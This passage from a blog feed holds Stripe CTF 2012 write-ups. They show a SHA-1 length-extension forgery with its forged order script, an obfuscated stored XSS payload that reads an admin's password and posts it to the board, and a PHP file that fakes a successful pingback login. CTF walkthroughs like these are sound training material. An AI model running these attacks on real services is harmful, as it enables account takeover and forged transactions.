&lt;span class="s2"&gt;&amp;quot;count=10&amp;amp;lat=37.351&amp;amp;user_id=1&amp;amp;long=-119.827&amp;amp;waffle=eggo&amp;quot;&lt;/span&gt;
78943cff885d4b41ff058aa64a36520e66ffdbbe &lt;span class="s2"&gt;&amp;quot;&amp;amp;waffle=liege&amp;quot;&lt;/span&gt;
new msg:
&lt;span class="s1"&gt;&amp;#39;count=10&amp;amp;lat=37.351&amp;amp;user_id=1&amp;amp;long=-119.827&amp;amp;waffle=eggo\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02(&amp;amp;waffle=liege&amp;#39;&lt;/span&gt;
base64:
&lt;span class="nv"&gt;Y291bnQ9MTAmbGF0PTM3LjM1MSZ1c2VyX2lkPTEmbG9uZz0tMTE5LjgyNyZ3YWZmbGU9ZWdnb4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIoJndhZmZsZT1saWVnZQ&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;
new sig: f7d4b492cc3282cd87e61624ee207ca496e807e4
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now, we just have to make the order:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# File forged_client.py&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;pycurl&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;urllib&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;StringIO&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;order&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;endpoint&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;http://localhost:9233&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;body&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;
        &lt;span class="s"&gt;&amp;#39;count=10&amp;amp;lat=37.351&amp;amp;user_id=1&amp;amp;long=-119.827&amp;amp;waffle=eggo&lt;/span&gt;&lt;span class="se"&gt;\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02&lt;/span&gt;&lt;span class="s"&gt;(&amp;amp;waffle=liege&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;signature&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;f7d4b492cc3282cd87e61624ee207ca496e807e4&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;body&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;|sig:&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;signature&lt;/span&gt;

    &lt;span class="n"&gt;output&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;StringIO&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StringIO&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;curl_object&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pycurl&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Curl&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;curl_object&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setopt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pycurl&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;URL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;endpoint&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/orders&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;curl_object&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setopt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pycurl&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;POST&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;curl_object&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setopt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pycurl&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;POSTFIELDS&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;curl_object&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setopt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pycurl&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;WRITEFUNCTION&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;output&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;curl_object&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;perform&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;curl_object&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="n"&gt;resp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;output&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getvalue&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;resp&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;order&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;python forged_client.py
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;confirm_code&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;dummy-password&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Great news: 10 liege&lt;/span&gt;
&lt;span class="s2"&gt;waffles will soon be flying your way!&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;success&amp;quot;&lt;/span&gt;: &lt;span class="nb"&gt;true&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;w00t!&lt;/p&gt;
</summary></entry><entry><title>Stripe CTF: Level #6</title><link href="https://allyourbase.utouch.fr/posts/2012/10/28/stripe-ctf-level-6/" rel="alternate"></link><updated>2012-10-28T12:42:00+01:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-10-28:posts/2012/10/28/stripe-ctf-level-6/</id><summary type="html">&lt;img alt="level06-logo.jpg" class="align-center" src="/images/stripe-ctf-level-6/level06-logo.jpg" /&gt;
&lt;p&gt;You can find the code for this level
&lt;a class="reference external" href="/docs/stripe-ctf-level-6/stripe-ctf-level06.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(sha256:
&lt;code&gt;0fed78164db1eced67ff8eeba0998c81901880b293667f63f74e2838e63d2bf3&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;This level is a message board: you can share updates with your
friends. The only thing is, you can't put messages with quotes and
double quotes, in order to prevent SQL injection. You also can't change
your password, but don't worry, it's visible on your profile page. Can
we use this to retrieve the admin's password?&lt;/p&gt;
&lt;p&gt;This level is a lot like level #4. When you post a message, the
server only checks for quotes and double quotes, not for script tags.
So, we can post a message consisting of javascript code which will
retrieve the password and post it on the board. But we can't use quotes
or double quotes: we'll have to obfuscate our code. And since the
admin's password contains quotes and double quotes, we'll have to
obfuscate it as well before we post it to the board. I chose to use
base64, and I found a javascript implementation
&lt;a class="reference external" href="http://www.webtoolkit.info/javascript-base64.html"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;pwn_password&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;xml_password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nx"&gt;xml_password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;XMLHttpRequest&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

    &lt;span class="nx"&gt;xml_password&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;GET&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/user_info&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;xml_password&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;password_page&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;xml_password&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;responseText&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;csrf_token&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;new_post&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;elements&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;_csrf&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;params&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;title=password&amp;amp;body=&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
    &lt;span class="nx"&gt;escape&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;Base64&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;escape&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;password_page&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;amp;_csrf=&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
    &lt;span class="nx"&gt;escape&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;csrf_token&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;xml_post&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nx"&gt;xml_post&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;XMLHttpRequest&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

    &lt;span class="nx"&gt;xml_post&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;POST&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/posts&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;xml_post&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setRequestHeader&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Content-Type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;application/x-www-form-urlencoded&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;xml_post&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setRequestHeader&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Content-Length&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;params&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;length&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;xml_post&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setRequestHeader&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Connection&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;keep-alive&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;xml_post&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;params&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nb"&gt;window&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;onload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;pwn_password&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We'll obfuscate it using String.fromCharCode (the following result
contains also the base64 function):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nt"&gt;&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class="nb"&gt;eval&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;String&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;fromCharCode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;47&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;42&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;42&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;42&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[...]&lt;/span&gt; &lt;span class="mi"&gt;41&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;59&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;125&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;&lt;/span&gt;
&lt;span class="c"&gt;&amp;lt;!-- The result is too big to be displayed entirely --&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Let's post this and wait for the admin to log in.&lt;/p&gt;
&lt;img alt="level06-form.png" class="align-center" src="/images/stripe-ctf-level-6/level06-form.png" /&gt;
&lt;p&gt;Now, we check the source code, and we see some base64-encoded stuff.&lt;/p&gt;
&lt;img alt="level06-source.png" class="align-center" src="/images/stripe-ctf-level-6/level06-source.png" /&gt;
&lt;p&gt;We just have to decode it.&lt;/p&gt;
&lt;img alt="level06-base64-decoded.png" class="align-center" src="/images/stripe-ctf-level-6/level06-base64-decoded.png" /&gt;
&lt;p&gt;We URL decode it, to clean a little bit:&lt;/p&gt;
&lt;img alt="level06-w00t.png" class="align-center" src="/images/stripe-ctf-level-6/level06-w00t.png" /&gt;
&lt;p&gt;w00t!&lt;/p&gt;
</summary></entry><entry><title>Stripe CTF: Level #5</title><link href="https://allyourbase.utouch.fr/posts/2012/10/27/stripe-ctf-level-5/" rel="alternate"></link><updated>2012-10-27T23:31:00+02:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-10-27:posts/2012/10/27/stripe-ctf-level-5/</id><summary type="html">&lt;img alt="level05-logo.jpg" class="align-center" src="/images/stripe-ctf-level-5/level05-logo.jpg" /&gt;
&lt;p&gt;You can find the code for this level
&lt;a class="reference external" href="/docs/stripe-ctf-level-5/stripe-ctf-level05.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(sha256:
&lt;code&gt;82b066cca46fd24a16959ada973d6df0d7c693f7791a8b673add276f324a5885&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;This level wants to solve a real problem: identification. We have too
many online accounts and we have to remember usernames/passwords for
everyone of them. It would be way simpler to be able to log into a new
web service using your Google account, or your Facebook account (kind of
like &lt;a class="reference external" href="https://en.wikipedia.org/wiki/OpenID"&gt;OpenID&lt;/a&gt;). That's what
this level is all about.&lt;/p&gt;
&lt;p&gt;This service asks for a pingback address (it's the service you want
to use to identify, like using Google or Facebook with OpenID), and your
username/password to this pingback. The form will then send your
credentials to the pingback and see if you're successfully
authenticated.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;# File srv.rb, line 20&lt;/span&gt;
&lt;span class="no"&gt;PASSWORD_HOSTS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sr"&gt;/^level05-\d+\.stripe-ctf\.com$/&lt;/span&gt; &lt;span class="c1"&gt;# To get the password, the pingback must follow this regex&lt;/span&gt;
&lt;span class="no"&gt;ALLOWED_HOSTS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sr"&gt;/\.stripe-ctf\.com$/&lt;/span&gt; &lt;span class="c1"&gt;# The pingback must follow this regex&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Note that these regex were for the real CTF. For a local usage, here are
what they look like:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;# File srv.rb, line 23&lt;/span&gt;
&lt;span class="no"&gt;PASSWORD_HOSTS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sr"&gt;/^localhost$/&lt;/span&gt; &lt;span class="c1"&gt;# To get the password, the pingback must follow this regex&lt;/span&gt;
&lt;span class="no"&gt;ALLOWED_HOSTS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sr"&gt;//&lt;/span&gt; &lt;span class="c1"&gt;# No restriction on the allowed hosts&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can only use pingback URL ending in .stripe-ctf.com, but fortunately,
we still have access to the social network on level #2! We can upload a
PHP file, which will always say the authentication is successful.&lt;/p&gt;
&lt;p&gt;Note: on the next screenshots, I'll use 127.0.0.1 as the address for
level #2, and localhost as the address for level #5!&lt;/p&gt;
&lt;p&gt;So, how does the service know that we were successfully authenticated to
the pingback?&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;# File srv.rb, line 109&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;authenticated?&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;body&lt;/span&gt; &lt;span class="o"&gt;=~&lt;/span&gt; &lt;span class="sr"&gt;/[^\w]AUTHENTICATED[^\w]*$/&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, all we have to do is upload the following file to level #2:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; AUTHENTICATED &lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Let's fill the form to use &lt;code&gt;level02-[numbers].stripe-ctf.com&lt;/code&gt;
as a pingback:&lt;/p&gt;
&lt;img alt="level05-first-form.png" class="align-center" src="/images/stripe-ctf-level-5/level05-first-form.png" /&gt;
&lt;p&gt;We submit, and here are the result of the authentication...&lt;/p&gt;
&lt;img alt="level05-first-login.png" class="align-center" src="/images/stripe-ctf-level-5/level05-first-login.png" /&gt;
&lt;p&gt;...and the new login page:&lt;/p&gt;
&lt;img alt="level05-first-authentication.png" class="align-center" src="/images/stripe-ctf-level-5/level05-first-authentication.png" /&gt;
&lt;p&gt;Okay, now we can authenticate using this script, but we can't recover
the password, cause the URL is
&lt;code&gt;level02-[numbers].stripe-ctf.com&lt;/code&gt;, and not
&lt;code&gt;level05-[numbers].stripe-ctf.com&lt;/code&gt;. The key is to see how the
server recovers the pingback URL we give him:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;# File srv.rb, line 67&lt;/span&gt;
&lt;span class="n"&gt;pingback&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:pingback&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:username&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:password&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="o"&gt;[...]&lt;/span&gt;
&lt;span class="c1"&gt;# File srv.rb, line 80&lt;/span&gt;
&lt;span class="n"&gt;body&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;perform_authenticate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pingback&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;[...]&lt;/span&gt;
&lt;span class="c1"&gt;# File srv.rb, line 99&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;perform_authenticate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="vg"&gt;$log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Sending request to &lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;RestClient&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="ss"&gt;:password&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                                     &lt;span class="ss"&gt;:username&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
    &lt;span class="n"&gt;body&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;body&lt;/span&gt;

